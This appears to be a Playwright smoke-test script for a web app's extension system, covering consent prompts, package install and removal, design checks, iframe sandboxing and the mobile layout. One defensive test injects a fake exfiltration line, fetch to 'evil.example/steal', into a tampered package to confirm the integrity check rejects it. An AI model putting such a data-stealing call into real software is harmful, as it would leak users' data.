// Browser smoke test for the extension host (Playwright). Not part of `npm test` (needs a browser):
//   npm run build && PLAYWRIGHT=/path/to/playwright/index.mjs CHROME=/usr/bin/google-chrome node test_ui_ext.mjs
// Real Chrome, real Workers, real sandboxed iframes: install with the consent prompt, a package feature type and check,
// removal and restore, the pane sandbox, an overlay with legend and probe, a tampered package, and a phone viewport.
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import assert from 'node:assert/strict';
import { readZip, writeZip } from './src/ext/zip.js';
const { chromium } = await import(process.env.PLAYWRIGHT || 'playwright');

const dist = path.resolve('dist');
const types = { '.html': 'text/html', '.js': 'text/javascript', '.wasm': 'application/wasm', '.alloyext': 'application/zip' };
const srv = http.createServer((q, s) => {
  const f = path.join(dist, q.url === '/' ? 'index.html' : q.url.split('?')[0]);
  if (!f.startsWith(dist) || !fs.existsSync(f)) { s.writeHead(404); return s.end(); }
  s.writeHead(200, { 'content-type': types[path.extname(f)] || 'application/octet-stream' }); fs.createReadStream(f).pipe(s);
}).listen(0);
const url = `http://localhost:${srv.address().port}/`;
const RIB = 'xyz.mdhv.sample-rib', PROBE = 'xyz.mdhv.sample-probe';

const browser = await chromium.launch({ executablePath: process.env.CHROME || undefined, args: ['--no-sandbox'] });
const ctx = await browser.newContext({ viewport: { width: 1280, height: 860 } });
const page = await ctx.newPage();
const errors = []; page.on('pageerror', (e) => errors.push(e.message));
page.on('dialog', (d) => d.accept());
const nets = []; page.on('request', (r) => { const u = new URL(r.url()); if (u.origin !== new URL(url).origin && !/^(data|blob):/.test(r.url())) nets.push(r.url()); });

await page.goto(url);
await page.waitForSelector('#p-tree .row', { timeout: 30000 });
const openExt = async () => { await page.click('#gear'); await page.click('#s-ext'); await page.waitForSelector('#extdlg[open]'); };
const closeExt = async () => { await page.click('#extclose'); };
const installSample = async (file) => { await openExt(); await page.click(`button[data-sample="${file}"]`); await page.waitForSelector('#extconsent[open]'); };

// ── 1. plugin: consent prompt, install, on in this project
await installSample('sample-rib.alloyext');
const consent = await page.textContent('#extc-body');
assert.match(consent, /Plugin: reads your design/); assert.match(consent, /doc\.read/); assert.match(consent, /checks/); assert.match(consent, /not a signature/);
await page.click('#extc-no');
assert.equal(await page.evaluate(() => window.__af.ext.registry.list().length), 0, 'cancel installs nothing');
await page.click('button[data-sample="sample-rib.alloyext"]'); await page.waitForSelector('#extconsent[open]'); await page.click('#extc-ok');
await page.waitForSelector(`.xpkg[data-ext="${RIB}"].on`);
assert.match(await page.textContent(`.xpkg[data-ext="${RIB}"] .tier`), /plugin/);
assert.match(await page.textContent(`.xpkg[data-ext="${RIB}"]`), /on in project/);
await closeExt();
assert.equal(await page.evaluate((id) => window.__af.S.project.extensions.find((e) => e.id === id).enabled, RIB), true);

// ── 2. a package feature type: add it, the kernel builds the built-in features it expands to
const before = await page.evaluate(() => window.__af.S.result.bodies.reduce((a, b) => a + b.volume, 0));
await page.selectOption('#addf', `${RIB}/rib`);
await page.waitForFunction(() => { const A = window.__af; return A.S.prep && A.S.prep.derived && A.S.result && A.S.project.features.some((f) => f.ext) && A.S.result.status[A.S.project.features.at(-1).id]?.ok; });
const ribId = await page.evaluate(() => window.__af.S.project.features.at(-1).id);
assert.equal(await page.evaluate(() => window.__af.S.project.features.at(-1).type), `${RIB}/rib`);
assert.ok(await page.evaluate((b) => window.__af.S.result.bodies.reduce((a, x) => a + x.volume, 0) > b, before), 'the rib added material');
assert.equal(await page.evaluate(() => window.__af.S.project.features.filter((f) => f.type === 'box' && f.fromExt).length), 0, 'derived features are not saved in the document');

// ── 3. checks: the package row joins the scorecard; a thin rib fails it
await page.click('[data-pane=check]'); await page.click('#run-checks');
await page.waitForSelector('#p-check .crow.pass:has-text("Ribs at least 1.2 mm thick")', { timeout: 30000 });
await page.evaluate((id) => { const A = window.__af, np = JSON.parse(JSON.stringify(A.S.project)); np.features.find((f) => f.id === id).thickness = '0.8'; A.commit(np); }, ribId);
await page.waitForTimeout(300); await page.click('#run-checks');
await page.waitForSelector('#p-check .crow.fail:has-text("Ribs at least 1.2 mm thick")', { timeout: 30000 });
assert.match(await page.textContent('#p-check .crow.fail:has-text("Ribs at least")'), /thinner than 1\.2 mm/);

// ── 4. removal: the project keeps the feature, marked and skipped; reload; reinstall restores it
await openExt();
await page.click(`.xpkg[data-ext="${RIB}"] [data-act=remove]`);
await page.waitForFunction((id) => !window.__af.ext.registry.get(id), RIB); await closeExt();
await page.click('[data-pane=tree]');
await page.waitForSelector('#p-tree .row .tag.cut:has-text("needs Sample: rib")');
assert.equal(await page.evaluate((id) => !!window.__af.S.project.features.find((f) => f.id === id), ribId), true, 'the feature is still in the document');
assert.equal(await page.evaluate((id) => window.__af.S.result.status[id].skipped, ribId), true);
assert.ok(await page.evaluate(() => window.__af.S.result.bodies.length > 0), 'the project still builds');
await page.reload(); await page.waitForSelector('#p-tree .row .tag.cut:has-text("needs Sample: rib")', { timeout: 30000 });
await installSample('sample-rib.alloyext'); await page.click('#extc-ok'); await closeExt();
await page.waitForFunction((id) => { const st = window.__af.S.result.status[id]; return st && st.ok && !st.skipped; }, ribId);
assert.equal(await page.$$eval('#p-tree .row .tag.cut', (r) => r.filter((x) => /needs/.test(x.textContent)).length), 0, 'the "needs" mark is gone after reinstall');

// ── 5. a tampered package is refused with the reason
const sample = new Uint8Array(fs.readFileSync(path.join(dist, 'ext-samples', 'sample-probe.alloyext')));
const parts = await readZip(sample); parts.set('main.js', new TextEncoder().encode('fetch("https://evil.example/steal")'));
await openExt();
await page.setInputFiles('#extfile', { name: 'tampered.alloyext', mimeType: 'application/zip', buffer: Buffer.from(await writeZip(Object.fromEntries(parts))) });
await page.waitForSelector('#exterr'); assert.match(await page.textContent('#exterr'), /integrity check failed/);
await page.setInputFiles('#extfile', { name: 'junk.alloyext', mimeType: 'application/zip', buffer: Buffer.from('not a zip at all') });
await page.waitForFunction(() => /not a zip/.test(document.querySelector('#exterr')?.textContent || ''));
await closeExt();

// ── 6. extension: pane in a sandboxed iframe, overlay with legend, probe
await installSample('sample-probe.alloyext');
assert.match(await page.textContent('#extc-body'), /Extension: runs its own code/);
assert.match(await page.textContent('#extc-body'), /ui\.pane/); assert.match(await page.textContent('#extc-body'), /scene\.overlay/);
await page.click('#extc-ok'); await closeExt();
await page.waitForSelector('#t-ext:not([hidden])'); await page.click('#t-ext');
await page.waitForSelector('#p-ext iframe.extframe');
assert.equal(await page.getAttribute('#p-ext iframe.extframe', 'sandbox'), 'allow-scripts', 'sandbox is exactly allow-scripts');
const frame = page.frames().find((f) => f !== page.mainFrame());
assert.ok(frame, 'pane document is loaded');
assert.equal(await frame.evaluate(() => fetch('https://example.com/').then(() => 'reached', () => 'blocked')), 'blocked', 'a pane has no network');
assert.equal(await frame.evaluate(() => { try { return typeof parent.document.title; } catch (e) { return 'blocked'; } }), 'blocked', 'a pane cannot touch the page');
assert.equal(await frame.evaluate(() => { try { return typeof localStorage.getItem('af.cfg'); } catch (e) { return 'blocked'; } }), 'blocked', 'a pane cannot read Forge storage');
await frame.click('#scan');
await frame.waitForFunction(() => /bodies/.test(document.getElementById('out').textContent), null, { timeout: 30000 });
await page.waitForSelector('#legend .lg .lgbar'); assert.equal((await page.$$('#legend .lgt span')).length, 5, 'legend prints five tick values');
assert.match(await page.textContent('#legend .lg'), /Vertex height/); assert.match(await page.textContent('#legend .lg'), /estimate/); assert.match(await page.textContent('#legend .lg'), /unit mm/);
const hit = await page.evaluate(() => { const r = document.querySelector('#vp canvas').getBoundingClientRect(); for (let y = r.top + 40; y < r.bottom - 40; y += 10) for (let x = r.left + 40; x < r.right - 40; x += 10) { const p = window.__af.view.probe(x, y); if (p) return { x, y }; } return null; });
assert.ok(hit, 'an overlay point can be found on screen');
await page.mouse.click(hit.x, hit.y);
await page.waitForSelector('#probe:not([hidden])'); assert.match(await page.textContent('#probe'), /Vertex height\s+-?\d/); assert.match(await page.textContent('#probe'), /mm/); assert.match(await page.textContent('#probe'), /estimate/);
if (process.env.SHOT) await page.screenshot({ path: process.env.SHOT });
await frame.click('#clear'); await frame.waitForFunction(() => /cleared/.test(document.getElementById('out').textContent));
await page.waitForFunction(() => document.querySelector('#legend').hidden);

// the pane survives being hidden and shown; switching the package off drops its tab
await openExt(); await page.click(`.xpkg[data-ext="${PROBE}"] [data-act=toggle]`); await closeExt();
await page.waitForSelector('#t-ext[hidden]', { state: 'attached' });

// ── 7. nothing left the page except to this origin (no telemetry, no third parties)
assert.deepEqual(nets, [], 'no requests to other origins: ' + nets.join(', '));
assert.deepEqual(errors, []);

// ── 8. phone: Settings > Extensions is a bottom sheet, no sideways scroll, 40 px targets
const phone = await browser.newContext({ viewport: { width: 390, height: 844 }, hasTouch: true, isMobile: true, deviceScaleFactor: 2 });
const pp = await phone.newPage(); const perr = []; pp.on('pageerror', (e) => perr.push(e.message));
await pp.goto(url); await pp.waitForSelector('body.ready', { timeout: 30000 });
// (the header is wider than a 390 px screen on main too, so the gear is reached by scrolling the header)
await pp.$eval('#gear', (e) => e.scrollIntoView({ inline: 'center' })); await pp.click('#gear'); await pp.click('#s-ext'); await pp.waitForSelector('#extdlg[open]');
await pp.click('button[data-sample="sample-rib.alloyext"]'); await pp.waitForSelector('#extconsent[open]');
const sheet = await pp.$eval('#extconsent', (d) => { const r = d.getBoundingClientRect(); return { w: r.width, bottom: r.bottom, vh: innerHeight, radius: getComputedStyle(d).borderBottomLeftRadius }; });
assert.ok(sheet.w >= 385 && Math.abs(sheet.bottom - sheet.vh) <= 2, `consent is a bottom sheet: ${JSON.stringify(sheet)}`);
await pp.click('#extc-ok'); await pp.waitForSelector(`.xpkg[data-ext="${RIB}"]`);
const small = await pp.$$eval('#extdlg .chip, #extconsent .btn', (els) => els.filter((e) => e.offsetParent && e.getBoundingClientRect().height < 39.5).map((e) => e.textContent));
assert.deepEqual(small, [], 'tap targets are at least 40 px');
assert.ok(await pp.evaluate(() => document.scrollingElement.scrollWidth <= innerWidth && document.getElementById('extdlg').scrollWidth <= document.getElementById('extdlg').clientWidth + 1), 'no horizontal scroll');
if (process.env.SHOT) await pp.screenshot({ path: process.env.SHOT.replace(/\.png$/, '-phone.png') });
assert.deepEqual(perr, []);
console.log('ui ext smoke ok');
await browser.close(); srv.close();
